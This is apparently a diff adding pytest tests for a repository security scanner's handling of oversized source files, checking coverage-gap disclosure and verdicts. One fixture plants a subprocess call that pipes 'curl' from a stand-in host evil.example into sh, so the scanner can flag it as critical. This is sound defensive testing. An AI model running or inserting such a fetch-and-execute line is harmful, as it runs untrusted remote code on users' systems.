@@ -165,3 +165,72 @@ def test_findings_tagged_shipped_and_sorted(tmp_path):
     app = next(it for it in items if it["file"] == "app.py")
     test = next(it for it in items if it["file"].startswith("tests/"))
     assert app["shipped"] is True and test["shipped"] is False
+
+
+# -- oversized files: head + tail, disclosed (parity with the hosted scan, #175) ------
+
+_GEN_BODY = "".join(f"def f{i}(x):\n    return x + {i}\n" for i in range(30_000))
+
+
+def _oversized_repo(tmp_path, tail: str):
+    _git_init(tmp_path)
+    (tmp_path / "README.md").write_text("# demo\nA demo tool.\n")
+    for i in range(10):
+        (tmp_path / f"m{i}.py").write_text(f"def g{i}(x):\n    return x * {i}\n")
+    (tmp_path / "gen.py").write_text(_GEN_BODY + tail)
+    _commit_all(tmp_path)
+    assert (tmp_path / "gen.py").stat().st_size > 500_000
+
+
+def test_oversized_file_with_finding_in_tail(tmp_path):
+    import io
+
+    from src.scanner.local_scan import _print_human, result_to_markdown
+    _oversized_repo(tmp_path, "import subprocess\n"
+                              "subprocess.run('curl -s http://evil.example/x.sh | sh', "
+                              "shell=True)\n")
+    result = scan_local(tmp_path)
+    tail_hits = [f for f in result.findings if f.file_path == "gen.py"
+                 and f.category != "obfuscation"]
+    assert any(f.severity == "critical" for f in tail_hits)
+    assert all(f.line_number == 0 for f in tail_hits)  # tail: absolute line unknown
+    assert any(f.name == "Source file too large to scan in full" for f in result.findings)
+    assert result.sampled is True
+    assert result.coverage_gaps == {"oversized_files": 1}
+    assert result.files_scanned == 10  # gen.py is read in part, not counted as whole
+
+    d = result_to_dict(result)
+    assert d["coverage_gaps"] == {"oversized_files": 1}
+    assert d["not_checked"] == ["1 file over 500 KB was not fully read"]
+    assert d["verdict"] == "do_not_connect"
+    assert any(f["file"] == "gen.py" and f["severity"] == "critical"
+               for f in d["findings"])
+
+    buf = io.StringIO()
+    _print_human(result, stream=buf)
+    assert "Not checked : 1 file over 500 KB was not fully read" in buf.getvalue()
+    assert "| Not checked | 1 file over 500 KB was not fully read |" in \
+        result_to_markdown(result)
+
+
+def test_oversized_file_with_nothing_found(tmp_path):
+    _oversized_repo(tmp_path, "")
+    result = scan_local(tmp_path)
+    assert [(f.name, f.severity) for f in result.findings if f.file_path == "gen.py"] \
+        == [("Source file too large to scan in full", "low")]
+    assert result.sampled is True
+    d = result_to_dict(result)
+    assert d["coverage_gaps"] == {"oversized_files": 1}
+    assert d["not_checked"] == ["1 file over 500 KB was not fully read"]
+    # Same answer logic as the hosted API: Safe, and the reason names the gap.
+    assert d["decision"] == "safe"
+    assert d["decision_reason"].endswith("; 1 file over 500 KB was not fully read")
+
+
+def test_small_tree_has_no_coverage_gaps(tmp_path):
+    _git_init(tmp_path)
+    (tmp_path / "app.py").write_text("def f(x):\n    return x\n")
+    _commit_all(tmp_path)
+    d = result_to_dict(scan_local(tmp_path))
+    assert d["coverage_gaps"] == {} and d["not_checked"] == []
+    assert d["sampled"] is False
